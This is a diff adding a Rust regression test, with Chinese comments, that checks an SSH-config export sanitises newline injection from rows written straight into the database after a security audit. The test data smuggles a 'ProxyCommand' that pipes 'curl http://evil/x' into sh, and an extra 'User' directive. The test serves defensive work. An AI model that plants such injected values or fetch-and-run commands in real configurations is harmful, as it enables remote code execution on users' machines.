@@ -182,3 +182,50 @@ fn xshell_sessions_render_ini_per_host_with_safe_filenames() {
     let names: Vec<&str> = entries.iter().map(|(f, _)| f.as_str()).collect();
     assert!(names.contains(&"a_b_c.xsh"), "{names:?}");
 }
+
+/// 2026-11-01 安全审计 P1-2：OpenSSH config 导出面兜底——直写 DB 的存量脏
+/// 数据（绕开入口校验）不得在导出文本里「长出」新的指令行。
+#[test]
+fn ssh_config_text_escapes_control_chars_from_stored_rows() {
+    let dir = tempfile::tempdir().unwrap();
+    let vault = open_vault(dir.path());
+    // 绕过 Hosts::create（入口已拒控制字符），直写 DB 模拟存量脏数据。
+    vault
+        .with_conn(|conn| {
+            conn.execute(
+                "INSERT INTO hosts (name, group_id, tags, address, port, username, protocol,
+                    credential_id, jump_chain_id, encoding_override, theme_override,
+                    monitor_enabled, notes, created_at, updated_at)
+                 VALUES ('evil', NULL, '[]',
+                    '10.0.0.1\nProxyCommand sh -c \"curl http://evil/x|sh\"',
+                    22, 'root\nUser root2', 'ssh', NULL, NULL, NULL, NULL, 0, NULL, 0, 0)",
+                [],
+            )?;
+            Ok(())
+        })
+        .unwrap();
+
+    let text = ottr_vault::ssh_config_text(&vault).unwrap();
+    // 注入的文本不得**起一行**（换行被净化为空格 → 仍在原行内，成为无力的值）。
+    for line in text.lines() {
+        let l = line.trim_start();
+        assert!(
+            !l.starts_with("ProxyCommand") && !l.starts_with("User root2"),
+            "字段值不得越出本行变成新指令：{text}"
+        );
+    }
+    // 指令行总数不变（一个 Host 块 = Host/HostName/User/Port 四行 + 注释）。
+    assert_eq!(
+        text.lines()
+            .filter(|l| l.trim_start().starts_with("Host "))
+            .count(),
+        1,
+        "不得多出 Host 块：{text}"
+    );
+    // 值仍在本行内（净化成空格，不丢内容）。
+    assert!(
+        text.lines()
+            .any(|l| l.trim_start().starts_with("HostName 10.0.0.1")),
+        "地址应仍在 HostName 行：{text}"
+    );
+}
